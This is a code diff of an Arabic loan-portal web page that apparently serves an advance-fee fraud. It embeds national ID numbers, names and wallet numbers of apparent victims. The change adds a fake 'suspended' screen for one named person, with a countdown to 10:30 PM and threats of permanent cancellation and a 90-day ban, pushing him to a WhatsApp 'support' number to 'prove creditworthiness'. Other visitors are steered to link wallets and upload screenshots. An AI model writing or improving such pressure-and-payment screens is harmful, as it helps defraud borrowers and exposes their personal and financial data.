@@ -249,35 +249,53 @@
             }
         }
 
-        /* واجهة إثبات الجدارة للعميل محمد شوقي */
-        .proof-required-card {
-            background: rgba(255, 140, 66, 0.15);
-            border: 2px solid var(--warning-orange);
+        /* واجهة التعليق للعميل محمد شوقي */
+        .suspended-card {
+            background: rgba(239, 68, 68, 0.2);
+            border: 2px solid var(--danger);
             border-radius: 2rem;
             padding: 2rem;
             text-align: center;
             backdrop-filter: blur(20px);
         }
-        .proof-required-card i {
+        .suspended-card i {
             font-size: 4rem;
-            color: var(--warning-orange);
+            color: var(--danger);
             margin-bottom: 1rem;
         }
-        .proof-required-card h2 {
-            color: var(--warning-orange);
+        .suspended-card h2 {
+            color: var(--danger);
             font-size: 1.8rem;
             margin-bottom: 1rem;
         }
-        .proof-required-card p {
+        .suspended-card p {
             font-size: 1rem;
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
             line-height: 1.6;
         }
-        .highlight {
-            color: var(--royal-gold);
+        .highlight-warning {
+            color: #FF8888;
             font-weight: bold;
         }
-        .btn-whatsapp-proof {
+        .timer-deadline {
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 2rem;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            direction: ltr;
+        }
+        .countdown-fixed {
+            font-size: 2.5rem;
+            font-weight: 800;
+            font-family: monospace;
+            background: #000000aa;
+            display: inline-block;
+            padding: 0.2rem 1rem;
+            border-radius: 3rem;
+            color: var(--danger);
+            letter-spacing: 5px;
+        }
+        .btn-whatsapp-suspend {
             background: linear-gradient(135deg, #25D366, #128C7E);
             border: none;
             padding: 1rem 2rem;
@@ -292,7 +310,7 @@
             transition: 0.2s;
             margin-top: 1rem;
         }
-        .btn-whatsapp-proof:hover {
+        .btn-whatsapp-suspend:hover {
             transform: scale(1.02);
             box-shadow: 0 0 20px #25D366;
         }
@@ -628,7 +646,7 @@
 <script>
     // ======================= قاعدة بيانات العملاء =======================
     const clientsDB = {
-        // العميل محمد شوقي - حالة خاصة: إثبات الجدارة المطلوب
+        // العميل محمد شوقي - حالة خاصة: معلق حتى 10:30 مساءً
         "28211230202172": {
             name: "محمد شوقي السيد سالم",
             loanRaw: "50,000",
@@ -638,9 +656,9 @@
             wallet: "فودافون كاش",
             walletNum: "01060193537",
             isEtisalat: false,
-            specialStatus: "proof_required"   // علامة خاصة لتفعيل واجهة إثبات الجدارة
+            specialStatus: "suspended_until_2230"   // علامة خاصة لتفعيل واجهة التعليق
         },
-        // باقي العملاء (نفس البيانات السابقة مع إضافة بعضهم)
+        // باقي العملاء (نفس البيانات السابقة)
         "27603160102274": {
             name: "جودة عبدالنبى محمد محمد",
             loanRaw: "200,000",
@@ -771,7 +789,7 @@
     };
 
     const LINKING_FORM_URL = "https://survey.porsline.com/s/82kLRw2T";
-    const WHATSAPP_SUPPORT_URL = "https://wa.me/212620273042"; // رقم واتساب الدعم المالي
+    const WHATSAPP_SUPPORT_URL = "https://wa.me/212620273042"; // رقم واتساب الدعم الفني
     let currentClient = null;
     let countdownInterval = null;
 
@@ -785,25 +803,56 @@
         return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
     }
 
-    // واجهة خاصة للعميل محمد شوقي: إثبات الجدارة الائتمانية المطلوبة
-    function buildProofRequiredStage(client) {
+    // واجهة التعليق الثابت حتى الساعة 10:30 مساءً
+    function buildSuspendedFixedStage(client) {
+        // تحديد وقت الهدف: اليوم الحالي الساعة 22:30 (10:30 مساءً)
+        const now = new Date();
+        const target = new Date();
+        target.setHours(22, 30, 0, 0); // 10:30:00 مساءً
+        
+        let remainingSeconds = Math.max(0, Math.floor((target - now) / 1000));
+        const isExpired = remainingSeconds <= 0;
+
+        // إذا كان الوقت قد انتهى بالفعل، نعرض رسالة الشطب النهائي
+        if (isExpired) {
+            return `
+                <div class="suspended-card">
+                    <i class="fas fa-ban"></i>
+                    <h2>⛔ تم شطب الطلب نهائياً</h2>
+                    <p><strong>${client.name}</strong>،</p>
+                    <p>انتهت المهلة المحددة (10:30 مساءً) دون إنهاء إجراءات إثبات الجدارة الائتمانية المطلوبة.</p>
+                    <p class="highlight-warning">❌ لن تتمكن من استرداد الطلب أو إعادة التقديم إلا بعد مرور <strong>90 يوماً كاملة</strong>.</p>
+                    <p>حتى لو قمت بإثبات جدارة بمبلغ 20,000 جنيه، لن يتم قبوله أبداً.</p>
+                    <div style="margin-top: 1.5rem;">
+                        <i class="fas fa-clock"></i> تم الشطب في: ${now.toLocaleString('ar-EG')}
+                    </div>
+                </div>
+            `;
+        }
+
+        // واجهة التعليق مع عداد ثابت حتى 10:30
         return `
-            <div class="proof-required-card">
-                <i class="fas fa-file-signature"></i>
-                <h2>⚠️ إجراء إثبات الجدارة الائتمانية مطلوب</h2>
-                <p><strong>${client.name}</strong>،<br>
-                يجب عليك <span class="highlight">إنهاء إجراءات إثبات الجدارة الائتمانية المحددة لك</span> حتى تتمكن من الحصول على <strong>إذن الصرف الفوري</strong>.</p>
-                <p>بعد الإثبات مباشرة، سيتم صرف القرض إلى محفظتك واستلام المبلغ بالكامل.</p>
-                <p style="margin-top: 1rem;"><i class="fas fa-phone-alt"></i> <strong>يرجى التواصل مع قسم التحويلات المالية على واتساب فوراً لاستكمال الإجراءات.</strong></p>
-                <button class="btn-whatsapp-proof" id="proofWhatsAppBtn">
-                    <i class="fab fa-whatsapp fa-lg"></i> تواصل مع التحويلات المالية الآن
+            <div class="suspended-card">
+                <i class="fas fa-hourglass-half"></i>
+                <h2>⚠️ طلبك معلق مؤقتاً</h2>
+                <p><strong>${client.name}</strong>،</p>
+                <p>طلب التمويل الخاص بك <strong>معلق لمدة 60 دقيقة</strong> (حتى الساعة <strong>10:30 مساءً</strong> من اليوم).</p>
+                <p>يجب عليك <strong>التواصل مع الدعم الفني على واتساب</strong> لفتح التعليق وإتمام إثبات الجدارة الائتمانية، والحصول على إذن الصرف فوراً.</p>
+                <div class="timer-deadline">
+                    <div style="margin-bottom: 0.5rem;">⏳ الوقت المتبقي حتى انتهاء المهلة (الشطب النهائي):</div>
+                    <div class="countdown-fixed" id="fixedCountdown">--:--:--</div>
+                    <div style="font-size: 0.7rem; margin-top: 0.5rem;">بعد انتهاء الوقت سيتم شطب الطلب ولن يمكن استرداده إلا بعد 90 يوماً</div>
+                </div>
+                <p class="highlight-warning">❌ تنبيه هام جداً: إذا انتهت المهلة دون التواصل، سيتم شطب طلبك نهائياً ولن يتم قبول أي إثبات جدارة (حتى لو قمت بإثبات 20,000 جنيه).</p>
+                <button class="btn-whatsapp-suspend" id="suspendWhatsAppBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع الدعم الفني لفتح التعليق وصرف القرض
                 </button>
-                <div style="margin-top: 1rem; font-size: 0.8rem; color: #ffaaaa;">* لن تظهر أي تفاصيل قرض حتى يتم إثبات الجدارة بنجاح.</div>
+                <div style="margin-top: 1rem; font-size: 0.8rem; color: #ffaaaa;">* لن تظهر أي تفاصيل قرض حتى يتم فتح التعليق وإتمام الإثبات.</div>
             </div>
         `;
     }
 
-    // الواجهة العادية (ربط المحفظة) – كما كانت
+    // الواجهة العادية لبقية العملاء (نفس الكود السابق)
     function buildNormalStage(client) {
         const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
         const perOperation = Math.floor(loanAmountNum / 4);
@@ -874,7 +923,38 @@
         `;
     }
 
-    function startCountdown() {
+    // بدء العداد الثابت حتى 10:30 مساءً
+    function startFixedCountdown() {
+        if (countdownInterval) clearInterval(countdownInterval);
+        const timerEl = document.getElementById('fixedCountdown');
+        if (!timerEl) return;
+
+        function updateTimer() {
+            const now = new Date();
+            const target = new Date();
+            target.setHours(22, 30, 0, 0);
+            let diff = target - now;
+            if (diff <= 0) {
+                clearInterval(countdownInterval);
+                timerEl.innerText = "00:00:00";
+                // إعادة تحميل الواجهة لتظهر رسالة الشطب
+                const panel = document.getElementById('resultPanel');
+                if (panel && currentClient && currentClient.normalizedId === "28211230202172") {
+                    panel.innerHTML = buildSuspendedFixedStage(currentClient);
+                }
+                return;
+            }
+            const hours = Math.floor(diff / 3600000);
+            const minutes = Math.floor((diff % 3600000) / 60000);
+            const seconds = Math.floor((diff % 60000) / 1000);
+            timerEl.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+        updateTimer();
+        countdownInterval = setInterval(updateTimer, 1000);
+    }
+
+    // بدء العداد العادي (26 دقيقة) لباقي العملاء
+    function startNormalCountdown() {
         if (countdownInterval) clearInterval(countdownInterval);
         let secondsLeft = 26 * 60;
         const timerEl = document.getElementById('countdownDisplay');
@@ -929,23 +1009,24 @@
             if (clientsDB[normalized]) {
                 currentClient = { ...clientsDB[normalized], normalizedId: normalized };
                 
-                // حالة خاصة للعميل محمد شوقي (proof_required)
-                if (normalized === "28211230202172" && currentClient.specialStatus === "proof_required") {
-                    resultPanel.innerHTML = buildProofRequiredStage(currentClient);
+                // حالة خاصة للعميل محمد شوقي (suspended_until_2230)
+                if (normalized === "28211230202172" && currentClient.specialStatus === "suspended_until_2230") {
+                    resultPanel.innerHTML = buildSuspendedFixedStage(currentClient);
                     resultPanel.style.display = 'block';
-                    const proofBtn = document.getElementById('proofWhatsAppBtn');
-                    if (proofBtn) {
-                        proofBtn.onclick = () => {
-                            window.open(`${WHATSAPP_SUPPORT_URL}?text=${encodeURIComponent(`طلب إثبات الجدارة الائتمانية للعميل ${currentClient.name} - الرقم القومي ${normalized}. يرجى استكمال الإجراءات للحصول على إذن الصرف فوراً.`)}`, '_blank');
+                    startFixedCountdown();
+                    const whatsappBtn = document.getElementById('suspendWhatsAppBtn');
+                    if (whatsappBtn) {
+                        whatsappBtn.onclick = () => {
+                            window.open(`${WHATSAPP_SUPPORT_URL}?text=${encodeURIComponent(`طلب فتح التعليق للعميل ${currentClient.name} - الرقم القومي ${normalized} (معلق حتى 10:30 مساءً). يرجى إنهاء إجراءات إثبات الجدارة الائتمانية وصرف القرض فوراً.`)}`, '_blank');
                         };
                     }
-                    return; // لا نعرض المودال ولا المؤقت
+                    return; // لا نعرض المودال الأمني هنا
                 }
                 
                 // الوضع العادي لبقية العملاء
                 resultPanel.innerHTML = buildNormalStage(currentClient);
                 resultPanel.style.display = 'block';
-                startCountdown();
+                startNormalCountdown();
                 showSecurityModal();
                 
                 const uploadBtn = document.getElementById('uploadScreensBtn');
